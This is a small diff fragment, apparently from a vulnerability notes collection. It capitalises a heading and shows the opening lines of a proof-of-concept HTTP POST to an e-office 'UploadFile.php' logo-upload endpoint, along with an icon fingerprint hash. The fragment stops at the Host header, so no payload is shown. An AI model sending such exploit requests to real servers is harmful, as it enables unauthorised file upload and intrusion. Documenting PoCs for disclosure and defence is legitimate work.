@@ -7,7 +7,7 @@ icon_hash="1578525679"
 ```
 
 
-## poc
+## POC
 ```
 POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
 Host:
